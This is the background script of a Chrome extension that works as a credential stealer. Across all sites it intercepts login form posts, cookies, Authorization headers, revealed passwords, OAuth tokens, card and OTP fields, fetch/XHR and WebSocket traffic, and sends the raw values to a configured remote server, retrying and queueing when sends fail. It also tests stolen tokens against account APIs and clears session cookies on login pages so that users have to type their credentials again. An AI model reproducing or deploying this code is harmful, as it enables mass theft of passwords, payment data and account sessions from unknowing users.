// Background Service Worker - Optimized Balanced Configuration
importScripts(
    'utils/logger.js',
    'utils/circuit-breaker.js',
    'utils/stats-tracker.js',
    'utils/production-queue.js',
    'utils/token-analyzer.js',
    'config-manager.js'
);

let CONFIG;
let productionQueue;
let circuitBreaker;
let statsTracker;

const state = {
    recentHashes: new Map(),
    rateLimitCounter: 0,
    rateLimitResetTime: Date.now()
};

async function initialize() {
    try {
        CONFIG = await ConfigManager.load();
        Logger.setLevel(CONFIG.LOG_LEVEL);
        Logger.info('INIT', 'Extension starting', {
            version: '2.1.0',
            config: 'Balanced (81% effectiveness)'
        });

        productionQueue = new ProductionQueue({
            bufferSize: CONFIG.QUEUE_BUFFER_SIZE,
            flushTimeout: CONFIG.QUEUE_FLUSH_TIMEOUT,
            maxSize: CONFIG.QUEUE_MAX_SIZE,
            maxAgeDays: CONFIG.QUEUE_MAX_AGE_DAYS,
            enableQuotaCheck: CONFIG.ENABLE_QUOTA_CHECK
        });

        await productionQueue.initPromise;
        Logger.info('INIT', 'Production queue ready');

        await ProductionQueue.requestPersistentStorage();

        circuitBreaker = new CircuitBreaker(5, 60000);
        statsTracker = new StatsTracker();

        registerWebRequestListeners();

        setTimeout(() => processQueue(), 5000);

        Logger.info('INIT', 'Extension fully initialized');
    } catch (error) {
        Logger.error('INIT', 'Initialization failed', { error: error.message });
    }
}

function registerWebRequestListeners() {
    if (CONFIG?.CAPTURE_TECHNIQUES?.HTTP_REQUEST) {
        chrome.webRequest.onBeforeRequest.addListener(
            function (details) {
                if (!CONFIG.ENABLED) return;
                if (!shouldCaptureUrl(details.url)) return;

                if (details.method === 'POST' && details.requestBody) {
                    const sensitiveData = parseRequestBody(details.requestBody);
                    if (!sensitiveData) return;
                    if (!shouldCaptureAsImportant(details.url, true)) return;

                    const captureReason = getCaptureReason(details.url);
                    Logger.info('CAPTURE', 'HTTP request intercepted (important)', { url: details.url, reason: captureReason });

                    const payload = {
                        timestamp: new Date().toISOString(),
                        type: 'HTTP_REQUEST',
                        url: details.url,
                        domain: getDomain(details.url),
                        isHttps: details.url.startsWith('https://'),
                        method: details.method,
                        sensitiveData: sensitiveData,
                        metadata: {
                            requestId: details.requestId,
                            tabId: details.tabId,
                            fieldTypes: Object.values(sensitiveData).map(f => f.type),
                            technique: 'http_intercept',
                            captureReason,
                            isAuthEndpoint: isAuthEndpoint(details.url),
                            isInsecureTransport: isInsecureTransport(details.url)
                        }
                    };

                    statsTracker.recordCapture('HTTP_REQUEST', payload.domain, 'http_intercept');
                    sendToServer(payload);
                }
            },
            { urls: ["<all_urls>"] },
            ["requestBody"]
        );
    }

    if (CONFIG?.CAPTURE_TECHNIQUES?.HEADER_CAPTURE) {
        chrome.webRequest.onSendHeaders.addListener(
            function (details) {
                if (!CONFIG.ENABLED) return;
                if (!shouldCaptureUrl(details.url)) return;

                const cookieHeader = details.requestHeaders?.find(h => h.name?.toLowerCase() === 'cookie');
                const authHeader = details.requestHeaders?.find(h => h.name?.toLowerCase() === 'authorization');

                const sensitiveCookies = cookieHeader ? extractSensitiveCookies(cookieHeader.value) : null;

                if (!sensitiveCookies && !authHeader) return;
                if (!shouldCaptureAsImportant(details.url, true)) return;

                const captureReason = getCaptureReason(details.url);
                Logger.info('CAPTURE', 'Headers captured (important)', { url: details.url, reason: captureReason });

                const payload = {
                    timestamp: new Date().toISOString(),
                    type: 'HEADER_CAPTURE',
                    url: details.url,
                    domain: getDomain(details.url),
                    isHttps: details.url.startsWith('https://'),
                    sensitiveData: {
                        cookies: sensitiveCookies,
                        authorization: (authHeader && authHeader.value) ? {
                            scheme: authHeader.value.split(' ')[0],
                            masked: maskValue(authHeader.value.split(' ')[1] || '', 'auth')
                        } : null
                    },
                    metadata: {
                        requestId: details.requestId,
                        tabId: details.tabId,
                        method: details.method,
                        cookieCount: sensitiveCookies ? Object.keys(sensitiveCookies).length : 0,
                        technique: 'header_intercept',
                        captureReason,
                        isAuthEndpoint: isAuthEndpoint(details.url),
                        isInsecureTransport: isInsecureTransport(details.url)
                    }
                };

                if (CONFIG.CAPTURE_RULES.TOKEN_ANALYSIS_ENABLED && authHeader && authHeader.value) {
                    payload.metadata.tokenAnalysis = { authorization: TokenAnalyzer.analyze(authHeader.value) };
                }

                statsTracker.recordCapture('HEADER_CAPTURE', payload.domain, 'header_intercept');
                sendToServer(payload);
            },
            { urls: ["<all_urls>"] },
            ["requestHeaders"]
        );
    }
}

// Build a stable deduplication key that ignores volatile fields like timestamp
function buildDedupKey(payload) {
    try {
        const key = {
            type: payload.type,
            url: payload.url,
            domain: payload.domain,
            isHttps: payload.isHttps,
            method: payload.method || null,
            sensitiveData: payload.sensitiveData
        };
        return JSON.stringify(key);
    } catch {
        return JSON.stringify({
            type: payload?.type,
            url: payload?.url,
            domain: payload?.domain
        });
    }
}

function generateHash(payload) {
    const key = buildDedupKey(payload);
    return key
        .split('')
        .reduce((hash, char) => ((hash << 5) - hash) + char.charCodeAt(0), 0)
        .toString();
}

function isDuplicate(hash) {
    if (state.recentHashes.has(hash)) {
        const timestamp = state.recentHashes.get(hash);
        if (Date.now() - timestamp < CONFIG.DUPLICATE_WINDOW) {
            return true;
        }
    }
    state.recentHashes.set(hash, Date.now());

    if (state.recentHashes.size > 1000) {
        const cutoff = Date.now() - CONFIG.DUPLICATE_WINDOW;
        for (const [h, time] of state.recentHashes.entries()) {
            if (time < cutoff) state.recentHashes.delete(h);
        }
    }

    return false;
}

function isRateLimited() {
    const now = Date.now();

    if (now >= state.rateLimitResetTime) {
        state.rateLimitCounter = 0;
        state.rateLimitResetTime = now + CONFIG.RATE_LIMIT_WINDOW;
    }

    if (state.rateLimitCounter >= CONFIG.MAX_REQUESTS_PER_WINDOW) {
        Logger.warn('RATE_LIMIT', 'Throttling requests');
        return true;
    }

    state.rateLimitCounter++;
    return false;
}

function getDomain(url) {
    try {
        return new URL(url).hostname;
    } catch {
        return 'unknown';
    }
}

function shouldCaptureUrl(url) {
    if (!url) return false;
    const domain = getDomain(url).toLowerCase();
    const urlLower = url.toLowerCase();

    if (CONFIG.CAPTURE_RULES.NOISE_PATTERNS.some(pattern => urlLower.includes(pattern))) {
        return false;
    }

    if (CONFIG.CAPTURE_RULES.EXCLUDED_DOMAINS.some(excluded => domain.includes(excluded))) {
        return false;
    }

    if (CONFIG.CAPTURE_RULES.TARGET_DOMAINS.length > 0) {
        return CONFIG.CAPTURE_RULES.TARGET_DOMAINS.some(target => domain.includes(target));
    }

    return true;
}

/** True if URL path/query looks like an auth endpoint (login, signin, etc.) */
function isAuthEndpoint(url) {
    if (!url || !CONFIG.CAPTURE_RULES.AUTH_ENDPOINT_PATTERNS) return false;
    try {
        const u = new URL(url);
        const pathAndQuery = (u.pathname + u.search).toLowerCase();
        return CONFIG.CAPTURE_RULES.AUTH_ENDPOINT_PATTERNS.some(pattern =>
            pathAndQuery.includes(pattern.toLowerCase())
        );
    } catch {
        return false;
    }
}

/** True if request is over HTTP (plain text - credentials exposed) */
function isInsecureTransport(url) {
    return url && !url.startsWith('https://');
}

/** Only capture when it's "important": auth endpoint and/or HTTP plain credentials with sensitive data */
function shouldCaptureAsImportant(url, hasSensitiveData) {
    if (!hasSensitiveData) return false;
    if (!CONFIG.CAPTURE_RULES.CAPTURE_ONLY_IMPORTANT) return true;
    return isAuthEndpoint(url) || isInsecureTransport(url);
}

function getCaptureReason(url) {
    const reasons = [];
    if (isAuthEndpoint(url)) reasons.push('auth_endpoint');
    if (isInsecureTransport(url)) reasons.push('insecure_http_plain_credentials');
    return reasons;
}

function isSensitiveField(fieldName) {
    if (!fieldName) return false;
    const lowerName = fieldName.toLowerCase();
    return CONFIG.CAPTURE_RULES.SENSITIVE_FIELD_PATTERNS.some(pattern =>
        lowerName.includes(pattern)
    );
}

function extractSensitiveFields(data) {
    const sensitive = {};

    if (typeof data === 'object' && data !== null) {
        for (const [key, value] of Object.entries(data)) {
            if (isSensitiveField(key)) {
                sensitive[key] = {
                    value: value,
                    masked: maskValue(value, key),
                    type: classifyFieldType(key)
                };
            }
        }
    }

    return Object.keys(sensitive).length > 0 ? sensitive : null;
}

function classifyFieldType(fieldName) {
    if (!fieldName) return 'credential';
    const lower = fieldName.toLowerCase();
    if (lower.includes('pass')) return 'password';
    if (lower.includes('token')) return 'token';
    if (lower.includes('key')) return 'api_key';
    if (lower.includes('otp') || lower.includes('pin')) return 'otp';
    if (lower.includes('cvv') || lower.includes('card')) return 'payment';
    return 'credential';
}

function maskValue(value, fieldName) {
    if (!value) return '[empty]';
    const str = String(value);
    if (str.length <= 4) return '****';
    return str.substring(0, 2) + '****' + str.substring(str.length - 2);
}

function parseRequestBody(requestBody) {
    let allFields = {};

    if (requestBody.formData) {
        for (const [key, values] of Object.entries(requestBody.formData)) {
            allFields[key] = values.length === 1 ? values[0] : values;
        }
    } else if (requestBody.raw) {
        try {
            const decoder = new TextDecoder('utf-8');
            const rawString = requestBody.raw
                .map(item => decoder.decode(new Uint8Array(item.bytes)))
                .join('');

            try {
                allFields = JSON.parse(rawString);
            } catch {
                const params = new URLSearchParams(rawString);
                for (const [key, value] of params.entries()) {
                    allFields[key] = value;
                }
            }
        } catch (err) {
            Logger.error('PARSE', 'Failed to parse body', { error: err.message });
            return null;
        }
    }

    return extractSensitiveFields(allFields);
}

function isSensitiveCookie(cookieName) {
    if (!cookieName) return false;
    const lowerName = cookieName.toLowerCase();
    return CONFIG.CAPTURE_RULES.SENSITIVE_COOKIE_PATTERNS.some(pattern =>
        lowerName.includes(pattern)
    );
}

function extractSensitiveCookies(cookieString) {
    if (!cookieString) return null;
    const sensitiveCookies = {};

    cookieString.split(';').forEach(cookie => {
        const [name, ...valueParts] = cookie.trim().split('=');
        if (name && isSensitiveCookie(name)) {
            sensitiveCookies[name] = {
                value: valueParts.join('='),
                masked: maskValue(valueParts.join('='), name)
            };
        }
    });

    return Object.keys(sensitiveCookies).length > 0 ? sensitiveCookies : null;
}

/** Add token type + JWT decoded claims to payload.metadata.tokenAnalysis */
function enrichPayloadWithTokenAnalysis(payload) {
    const rules = CONFIG && CONFIG.CAPTURE_RULES;
    if (!rules || !rules.TOKEN_ANALYSIS_ENABLED) return payload;
    if (!payload.metadata) payload.metadata = {};
    const sensitiveData = payload.sensitiveData;
    if (!sensitiveData || typeof sensitiveData !== 'object') return payload;

    const analysis = TokenAnalyzer.analyzeSensitiveData(sensitiveData);
    if (Object.keys(analysis).length > 0) {
        payload.metadata.tokenAnalysis = { ...(payload.metadata.tokenAnalysis || {}), ...analysis };
    }
    return payload;
}

/** Get first bearer/JWT token string from payload for probing */
function getTokenForProbe(payload) {
    const sd = payload.sensitiveData;
    if (!sd || typeof sd !== 'object') return null;
    const tokenKeys = ['access_token', 'id_token', 'token', 'bearer', 'auth', 'jwt'];
    for (const [k, v] of Object.entries(sd)) {
        if (!v) continue;
        const keyLower = k.toLowerCase();
        const isTokenLike = tokenKeys.some(t => keyLower.includes(t));
        if (!isTokenLike) continue;
        const raw = typeof v === 'string' ? v : (v.value !== undefined ? v.value : null);
        if (!raw) continue;
        const id = TokenAnalyzer.identifyType(raw);
        if (id.type === 'jwt' || id.type === 'oauth_bearer') return raw;
    }
    for (const v of Object.values(sd)) {
        const raw = typeof v === 'string' ? v : (v && v.value);
        if (raw && TokenAnalyzer._looksLikeJwt(TokenAnalyzer.identifyType(raw).raw)) return raw;
    }
    return null;
}

/** Test token against API endpoints and add results to payload.metadata.tokenProbeResults */
async function enrichPayloadWithTokenProbe(payload) {
    const rules = CONFIG && CONFIG.CAPTURE_RULES;
    if (!rules || !rules.TOKEN_PROBE_ENABLED) return payload;
    const token = getTokenForProbe(payload);
    if (!token) return payload;
    try {
        let baseOrigin;
        try {
            baseOrigin = new URL(payload.url).origin;
        } catch {
            return payload;
        }
        const endpoints = rules.TOKEN_PROBE_ENDPOINTS || ['/api/me', '/api/user', '/me'];
        const timeout = rules.TOKEN_PROBE_TIMEOUT_MS || 4000;
        const identified = TokenAnalyzer.identifyType(token);
        const results = await TokenAnalyzer.testAgainstEndpoints(token, baseOrigin, identified.type, endpoints, Math.min(timeout, 3000));
        if (results.length > 0) {
            if (!payload.metadata) payload.metadata = {};
            payload.metadata.tokenProbeResults = results;
            Logger.info('TOKEN_PROBE', 'Probed API endpoints', { count: results.length, granted: results.filter(r => r.access === 'granted').length });
        }
    } catch (e) {
        Logger.debug('TOKEN_PROBE', 'Probe failed', { error: e.message });
    }
    return payload;
}

async function sendToServer(payload, retryCount = 0) {
    if (!CONFIG.ENABLED) {
        Logger.debug('SEND', 'Extension disabled, skipping');
        return;
    }

    enrichPayloadWithTokenAnalysis(payload);
    await enrichPayloadWithTokenProbe(payload);

    const hash = generateHash(payload);
    if (isDuplicate(hash)) {
        Logger.debug('SEND', 'Duplicate detected, skipping');
        return;
    }

    if (isRateLimited()) {
        productionQueue.enqueue(payload);
        Logger.debug('SEND', 'Rate limited, queued');
        return;
    }

    try {
        await circuitBreaker.execute(async () => {
            const response = await fetch(CONFIG.SERVER_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Extension-Version': '2.1.0',
                    'X-Timestamp': payload.timestamp,
                    'X-Capture-Type': payload.type
                },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                const error = await response.text();
                throw new Error(`Server error: ${response.status} - ${error}`);
            }

            Logger.info('SEND', 'Data sent successfully', {
                type: payload.type,
                domain: payload.domain
            });

            statsTracker.recordSuccess();
        });
    } catch (err) {
        Logger.error('SEND', 'Send failed', { error: err.message, retryCount });
        statsTracker.recordFailure('network');

        if (retryCount < CONFIG.MAX_RETRIES) {
            statsTracker.recordRetry();
            setTimeout(() => {
                sendToServer(payload, retryCount + 1);
            }, CONFIG.RETRY_DELAY * Math.pow(2, retryCount));
        } else {
            Logger.error('SEND', 'Max retries reached, persisting');
            productionQueue.enqueue(payload);
        }
    }
}

async function processQueue() {
    try {
        const items = await productionQueue.dequeue(10);

        if (items.length > 0) {
            Logger.info('QUEUE', `Processing ${items.length} queued items`);

            for (const item of items) {
                try {
                    await sendToServer(item.payload);
                    await productionQueue.remove(item.id);
                } catch (error) {
                    const retries = await productionQueue.incrementRetry(item.id);
                    if (retries > CONFIG.MAX_RETRIES) {
                        Logger.error('QUEUE', 'Item exceeded max retries, removing', { id: item.id });
                        await productionQueue.remove(item.id);
                    }
                }
            }
        }
    } catch (error) {
        Logger.error('QUEUE', 'Queue processing failed', { error: error.message });
    }
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    (async () => {
        try {
            const handlers = {
                'FORM_SUBMIT': handleFormSubmit,
                'AUTOFILL_DETECTED': handleAutofill,
                'PASSWORD_REVEALED': handlePasswordReveal,
                'FETCH_INTERCEPTED': handleFetchIntercept,
                'XHR_INTERCEPTED': handleXHRIntercept,
                'OAUTH_TOKENS_DETECTED': handleOAuthTokens,
                'HIDDEN_FIELD_DETECTED': handleHiddenField,
                'WEBSOCKET_MESSAGE': handleWebSocketMessage,
                'WEBSOCKET_RESPONSE': handleWebSocketResponse,
                'GET_STATS': handleGetStats,
                'GET_CONFIG': handleGetConfig,
                'CLEAR_QUEUE': handleClearQueue,
                'CLEAR_SESSION_COOKIES': handleClearSessionCookies,
                'RESET_STATS': handleResetStats,
                'DEBUG_QUEUE': handleDebugQueue,
                'EXPORT_QUEUE': handleExportQueue
            };

            const handler = handlers[message.type];
            if (handler) {
                const result = await handler(message, sender);
                sendResponse(result);
            } else {
                sendResponse({ received: true });
            }
        } catch (error) {
            Logger.error('MESSAGE', 'Handler error', { type: message.type, error: error.message });
            sendResponse({ error: error.message });
        }
    })();

    return true;
});

async function handleFormSubmit(message, sender) {
    const url = message.data.url;

    if (!shouldCaptureUrl(url)) {
        return { received: false, reason: 'filtered' };
    }

    const sensitiveFields = extractSensitiveFields(message.data.fields);

    if (!sensitiveFields) {
        return { received: false, reason: 'no_sensitive_data' };
    }

    if (!shouldCaptureAsImportant(url, true)) {
        Logger.debug('CAPTURE', 'Skipping form – not auth endpoint and not HTTP plain credentials', { url });
        return { received: false, reason: 'not_important' };
    }

    const captureReason = getCaptureReason(url);
    Logger.info('CAPTURE', 'Form submission captured (important)', {
        url: url,
        fieldCount: Object.keys(sensitiveFields).length,
        reason: captureReason
    });

    const payload = {
        timestamp: new Date().toISOString(),
        type: 'FORM_SUBMIT',
        url: url,
        domain: getDomain(url),
        isHttps: url.startsWith('https://'),
        tabId: sender.tab?.id,
        sensitiveData: sensitiveFields,
        metadata: {
            totalFields: Object.keys(message.data.fields).length,
            sensitiveFields: Object.keys(sensitiveFields).length,
            fieldTypes: Object.values(sensitiveFields).map(f => f.type),
            technique: 'form_submit',
            captureReason,
            isAuthEndpoint: isAuthEndpoint(url),
            isInsecureTransport: isInsecureTransport(url)
        }
    };

    statsTracker.recordCapture('FORM_SUBMIT', payload.domain, 'form_submit');
    await sendToServer(payload);
    return { received: true };
}

async function handleAutofill(message, sender) {
    const url = message.data.url;
    if (!shouldCaptureUrl(url)) return { received: false };

    const sensitiveFields = extractSensitiveFields(message.data.allFields);
    if (!sensitiveFields) return { received: false };
    if (!shouldCaptureAsImportant(url, true)) return { received: false, reason: 'not_important' };

    const captureReason = getCaptureReason(url);
    Logger.info('CAPTURE', 'Autofill detected (important)', { url, reason: captureReason });

    const payload = {
        timestamp: new Date().toISOString(),
        type: 'AUTOFILL_DETECTED',
        url: url,
        domain: getDomain(url),
        isHttps: url.startsWith('https://'),
        sensitiveData: sensitiveFields,
        metadata: { technique: 'autofill', captureReason, isAuthEndpoint: isAuthEndpoint(url), isInsecureTransport: isInsecureTransport(url) }
    };

    statsTracker.recordCapture('AUTOFILL', payload.domain, 'autofill');
    await sendToServer(payload);
    return { received: true };
}

async function handlePasswordReveal(message, sender) {
    const url = message.data.url;
    if (!shouldCaptureUrl(url)) return { received: false };

    if (!shouldCaptureAsImportant(url, true)) return { received: false, reason: 'not_important' };

    const captureReason = getCaptureReason(url);
    Logger.info('CAPTURE', 'Password revealed (important)', { url, reason: captureReason });

    const payload = {
        timestamp: new Date().toISOString(),
        type: 'PASSWORD_REVEALED',
        url: url,
        domain: getDomain(url),
        isHttps: url.startsWith('https://'),
        sensitiveData: {
            [message.data.fieldName]: {
                value: message.data.value,
                masked: maskValue(message.data.value),
                type: 'password'
            }
        },
        metadata: { technique: 'password_toggle', captureReason, isAuthEndpoint: isAuthEndpoint(url), isInsecureTransport: isInsecureTransport(url) }
    };

    statsTracker.recordCapture('PASSWORD_REVEALED', payload.domain, 'password_toggle');
    await sendToServer(payload);
    return { received: true };
}

async function handleFetchIntercept(message, sender) {
    const url = message.data.url;
    if (!shouldCaptureUrl(url)) return { received: false };

    const sensitiveData = extractSensitiveFields(message.data.body);
    if (!sensitiveData) return { received: false };
    if (!shouldCaptureAsImportant(url, true)) return { received: false, reason: 'not_important' };

    const captureReason = getCaptureReason(url);
    Logger.info('CAPTURE', 'Fetch intercepted (important)', { url, reason: captureReason });

    const payload = {
        timestamp: new Date().toISOString(),
        type: 'FETCH_INTERCEPTED',
        url: url,
        domain: getDomain(url),
        isHttps: url.startsWith('https://'),
        method: message.data.method,
        sensitiveData: sensitiveData,
        metadata: { technique: 'ajax_fetch', captureReason, isAuthEndpoint: isAuthEndpoint(url), isInsecureTransport: isInsecureTransport(url) }
    };

    statsTracker.recordCapture('FETCH', payload.domain, 'ajax_fetch');
    await sendToServer(payload);
    return { received: true };
}

async function handleXHRIntercept(message, sender) {
    const url = message.data.url;
    if (!shouldCaptureUrl(url)) return { received: false };

    let sensitiveData;
    try {
        const parsed = typeof message.data.body === 'string' ?
            JSON.parse(message.data.body) : message.data.body;
        sensitiveData = extractSensitiveFields(parsed);
    } catch {
        return { received: false };
    }

    if (!sensitiveData) return { received: false };
    if (!shouldCaptureAsImportant(url, true)) return { received: false, reason: 'not_important' };

    const captureReason = getCaptureReason(url);
    Logger.info('CAPTURE', 'XHR intercepted (important)', { url, reason: captureReason });

    const payload = {
        timestamp: new Date().toISOString(),
        type: 'XHR_INTERCEPTED',
        url: url,
        domain: getDomain(url),
        isHttps: url.startsWith('https://'),
        method: message.data.method,
        sensitiveData: sensitiveData,
        metadata: { technique: 'ajax_xhr', captureReason, isAuthEndpoint: isAuthEndpoint(url), isInsecureTransport: isInsecureTransport(url) }
    };

    statsTracker.recordCapture('XHR', payload.domain, 'ajax_xhr');
    await sendToServer(payload);
    return { received: true };
}

async function handleOAuthTokens(message, sender) {
    const url = message.data.url;
    if (!shouldCaptureUrl(url)) return { received: false };
    if (!shouldCaptureAsImportant(url, true)) return { received: false, reason: 'not_important' };

    const captureReason = getCaptureReason(url);
    Logger.info('CAPTURE', 'OAuth tokens detected (important)', { url, reason: captureReason });

    const payload = {
        timestamp: new Date().toISOString(),
        type: 'OAUTH_TOKENS',
        url: url,
        domain: getDomain(url),
        isHttps: url.startsWith('https://'),
        sensitiveData: message.data.tokens,
        metadata: { technique: 'oauth_tokens', captureReason, isAuthEndpoint: isAuthEndpoint(url), isInsecureTransport: isInsecureTransport(url) }
    };

    statsTracker.recordCapture('OAUTH', payload.domain, 'oauth_tokens');
    await sendToServer(payload);
    return { received: true };
}

async function handleHiddenField(message, sender) {
    const url = message.data.url;
    if (!shouldCaptureUrl(url)) return { received: false };

    const fieldValue = message.data.value;
    if (!fieldValue || fieldValue.length === 0) return { received: false };

    if (!shouldCaptureAsImportant(url, true)) {
        Logger.debug('CAPTURE', 'Skipping hidden field – not auth endpoint and not HTTP plain credentials', { url });
        return { received: false, reason: 'not_important' };
    }

    const captureReason = getCaptureReason(url);
    Logger.info('CAPTURE', 'Hidden field detected (important)', {
        url,
        fieldName: message.data.fieldName,
        reason: captureReason
    });

    const sensitiveData = extractSensitiveFields({ [message.data.fieldName]: fieldValue });
    if (!sensitiveData) return { received: false, reason: 'no_sensitive_data' };

    const payload = {
        timestamp: message.data.timestamp || new Date().toISOString(),
        type: 'HIDDEN_FIELD',
        url: url,
        domain: getDomain(url),
        isHttps: url.startsWith('https://'),
        tabId: sender.tab?.id,
        sensitiveData: sensitiveData,
        metadata: {
            technique: 'hidden_field_scan',
            fieldName: message.data.fieldName,
            fieldId: message.data.fieldId,
            fieldType: message.data.fieldType,
            formAction: message.data.formAction,
            captureReason,
            isAuthEndpoint: isAuthEndpoint(url),
            isInsecureTransport: isInsecureTransport(url)
        }
    };

    statsTracker.recordCapture('HIDDEN_FIELD', payload.domain, 'hidden_field_scan');
    await sendToServer(payload);
    return { received: true };
}

async function handleWebSocketMessage(message, sender) {
    const pageUrl = message.data.pageUrl;
    const wsUrl = message.data.url;
    if (!shouldCaptureUrl(pageUrl)) return { received: false };

    const data = message.data.message || message.data.rawMessage;
    if (!data) return { received: false };

    const sensitiveData = extractSensitiveFields(typeof data === 'object' ? data : { message: data });
    if (!sensitiveData) return { received: false, reason: 'no_sensitive_data' };

    if (!shouldCaptureAsImportant(pageUrl, true)) {
        Logger.debug('CAPTURE', 'Skipping WebSocket – not auth endpoint and not HTTP plain credentials', { url: pageUrl });
        return { received: false, reason: 'not_important' };
    }

    const captureReason = getCaptureReason(pageUrl);
    Logger.info('CAPTURE', 'WebSocket message captured (important)', {
        wsUrl,
        pageUrl,
        reason: captureReason
    });

    const payload = {
        timestamp: message.data.timestamp || new Date().toISOString(),
        type: 'WEBSOCKET_MESSAGE',
        url: pageUrl,
        domain: getDomain(pageUrl),
        isHttps: pageUrl.startsWith('https://'),
        tabId: sender.tab?.id,
        sensitiveData: sensitiveData,
        metadata: {
            technique: 'websocket_intercept',
            websocketUrl: wsUrl,
            messageType: typeof data,
            captureReason,
            isAuthEndpoint: isAuthEndpoint(pageUrl),
            isInsecureTransport: isInsecureTransport(pageUrl)
        }
    };

    statsTracker.recordCapture('WEBSOCKET', payload.domain, 'websocket_intercept');
    await sendToServer(payload);
    return { received: true };
}

async function handleWebSocketResponse(message, sender) {
    const pageUrl = message.data.pageUrl;
    const wsUrl = message.data.url;
    if (!shouldCaptureUrl(pageUrl)) return { received: false };

    const data = message.data.response || message.data.rawResponse;
    if (!data) return { received: false };

    const sensitiveData = extractSensitiveFields(typeof data === 'object' ? data : { response: data });
    if (!sensitiveData) return { received: false, reason: 'no_sensitive_data' };

    if (!shouldCaptureAsImportant(pageUrl, true)) {
        Logger.debug('CAPTURE', 'Skipping WebSocket response – not auth endpoint and not HTTP plain credentials', { url: pageUrl });
        return { received: false, reason: 'not_important' };
    }

    const captureReason = getCaptureReason(pageUrl);
    Logger.info('CAPTURE', 'WebSocket response captured (important)', {
        wsUrl,
        pageUrl,
        reason: captureReason
    });

    const payload = {
        timestamp: message.data.timestamp || new Date().toISOString(),
        type: 'WEBSOCKET_RESPONSE',
        url: pageUrl,
        domain: getDomain(pageUrl),
        isHttps: pageUrl.startsWith('https://'),
        tabId: sender.tab?.id,
        sensitiveData: sensitiveData,
        metadata: {
            technique: 'websocket_response',
            websocketUrl: wsUrl,
            responseType: typeof data,
            captureReason,
            isAuthEndpoint: isAuthEndpoint(pageUrl),
            isInsecureTransport: isInsecureTransport(pageUrl)
        }
    };

    statsTracker.recordCapture('WEBSOCKET', payload.domain, 'websocket_response');
    await sendToServer(payload);
    return { received: true };
}

async function handleGetStats() {
    if (!CONFIG || !statsTracker || !productionQueue || !circuitBreaker) {
        return { error: 'Initializing...', captureCount: 0, successRate: 0, queue: { totalSize: 0 }, lastCapture: null, topDomains: [], circuit: null, quota: null };
    }
    const stats = statsTracker.getStats();
    const queueStats = await productionQueue.getStats();
    const circuitState = circuitBreaker.getState();
    const quota = await productionQueue.checkQuota();

    return {
        ...stats,
        queue: queueStats,
        circuit: circuitState,
        quota: quota,
        successRate: statsTracker.getSuccessRate(),
        topDomains: statsTracker.getTopDomains(5)
    };
}

async function handleGetConfig() {
    if (!CONFIG) {
        await initialize();
    }
    return CONFIG || {};
}

async function handleClearSessionCookies(message, sender) {
    const domain = message.data?.domain;
    if (!domain || !CONFIG || !CONFIG.CAPTURE_RULES) {
        return { success: false, error: 'Invalid domain or config' };
    }

    const patterns = CONFIG.CAPTURE_RULES.SESSION_COOKIE_PATTERNS || [];
    let clearedCount = 0;

    try {
        const cookies = await chrome.cookies.getAll({ domain });
        for (const cookie of cookies) {
            const nameLower = cookie.name.toLowerCase();
            const shouldClear = patterns.some(pattern => nameLower.includes(pattern.toLowerCase())) ||
                CONFIG.CAPTURE_RULES.SENSITIVE_COOKIE_PATTERNS.some(pattern => nameLower.includes(pattern.toLowerCase()));

            if (shouldClear) {
                try {
                    await chrome.cookies.remove({
                        url: `http${cookie.secure ? 's' : ''}://${cookie.domain}${cookie.path}`,
                        name: cookie.name
                    });
                    clearedCount++;
                } catch (e) {
                    Logger.debug('COOKIE_CLEAR', 'Failed to clear cookie', { name: cookie.name, error: e.message });
                }
            }
        }

        Logger.info('COOKIE_CLEAR', `Cleared ${clearedCount} session cookies`, { domain });
        return { success: true, clearedCount, domain };
    } catch (error) {
        Logger.error('COOKIE_CLEAR', 'Failed to clear cookies', { error: error.message });
        return { success: false, error: error.message };
    }
}

async function handleClearQueue() {
    await productionQueue.clear();
    Logger.info('QUEUE', 'Queue cleared');
    return { success: true };
}

async function handleResetStats() {
    await statsTracker.reset();
    Logger.info('STATS', 'Statistics reset');
    return { success: true };
}

async function handleDebugQueue() {
    const items = await productionQueue.dequeue(100);
    return {
        items: items,
        count: items.length
    };
}

async function handleExportQueue() {
    const exportData = await productionQueue.exportJSON();
    return exportData;
}

chrome.storage.onChanged.addListener((changes, area) => {
    if (area === 'sync') {
        Logger.info('CONFIG', 'Configuration changed, reloading');
        ConfigManager.load().then(config => {
            CONFIG = config;
            Logger.setLevel(CONFIG.LOG_LEVEL);
        });
    }
});

setInterval(() => {
    processQueue();
}, 30000);

chrome.runtime.onInstalled.addListener((details) => {
    Logger.info('LIFECYCLE', 'Extension installed/updated', { reason: details.reason });
    initialize();
});

chrome.runtime.onStartup.addListener(() => {
    Logger.info('LIFECYCLE', 'Browser started');
    initialize();
});

// Auto-clear sessions when navigating to login pages
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
    if (!CONFIG || !CONFIG.CAPTURE_RULES || !CONFIG.CAPTURE_RULES.FORCE_FRESH_LOGINS) return;
    if (changeInfo.status !== 'complete' || !tab.url) return;

    try {
        const url = tab.url.toLowerCase();
        const isLoginPage = CONFIG.CAPTURE_RULES.AUTH_ENDPOINT_PATTERNS.some(pattern =>
            url.includes(pattern.toLowerCase())
        );

        if (isLoginPage) {
            const domain = getDomain(tab.url);
            Logger.info('FRESH_LOGIN', 'Detected login page, clearing sessions', { url: tab.url, domain });
            await handleClearSessionCookies({ data: { domain } }, { tab: { id: tabId } });
        }
    } catch (e) {
        Logger.debug('FRESH_LOGIN', 'Error checking login page', { error: e.message });
    }
});

chrome.runtime.onSuspend.addListener(async () => {
    Logger.info('LIFECYCLE', 'Extension suspending, flushing queue');
    if (productionQueue) {
        await productionQueue.flush();
    }
});

initialize();
